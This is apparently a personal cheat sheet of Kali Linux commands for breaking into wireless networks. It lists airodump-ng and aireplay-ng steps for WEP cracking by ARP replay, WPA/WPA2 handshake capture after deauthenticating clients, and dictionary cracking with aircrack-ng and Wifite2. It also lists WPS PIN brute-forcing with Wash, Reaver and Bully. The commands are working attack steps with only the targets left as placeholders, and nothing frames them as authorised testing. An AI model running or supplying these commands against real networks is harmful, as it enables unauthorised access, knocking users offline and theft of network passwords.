# to enable full screen mode after installing Kali Linux on the virtual box
apt-get install -y virtualbox-guest-x11

# for information gathering from a single wireless network
airodump-ng -c|--channel <channel number> -d|--bssid <the mac address of target network> -w|--write <dump file name> <interface name>

--------------------------------------------------------------

# WEP cracking ways: RC4, CRC-32, IVs
# here is: IVs

# to send fake authentication to a single client
# target AP name is case sensitive
aireplay-ng -1|--fakeauth 0 -e <target AP name> -a <target AP mac> -h <client mac> <interface name>

# we are going to make an additional traffic on the target network...
aireplay-ng -3|--arpreplay -b <target AP mac> -h <client mac> <interface name>

# to send injection based on dump file
aircrack-ng -b <target AP mac> WirelessDumpFile.cap

---------------------------------------------------------------

# WPA/WPA2:

# capture a WPA/WPA2 handshake
airodump-ng <interface name>
airodump-ng --channel|-c 11 --bssid <target AP mac> --write|-w <cap file name> <interface name>

# perform a deauthorization attack against client
aireplay-ng --deauth 0 -a <target AP mac> -c <client mac address> <interface name>

# crack the handshake using a dictionary attack
aircrack-ng <cap file name> -w <word/password list file path>

# NOW, using Wifite2 (get it from github)
./Wifite.py --no-reaver --dict <word/password list path>

------------------------------------------------------------------

# WPS:

# use the Wash to identity WPS networks
wash -i <interface name>

# use Reaver to determine the WPS pin
# this is the WPS attacking tool
# we should use it to run a brute force attack
reaver -i <interface name> -b <target AP mac> -vv -N

# use Bully to find the WPA2 password with known WPS pin
# if we have the pin, we should use Bully to find the password unless waiting to find the pin with reaver
bully -b <target AP mac> -p <WPS pin code> <interface name>

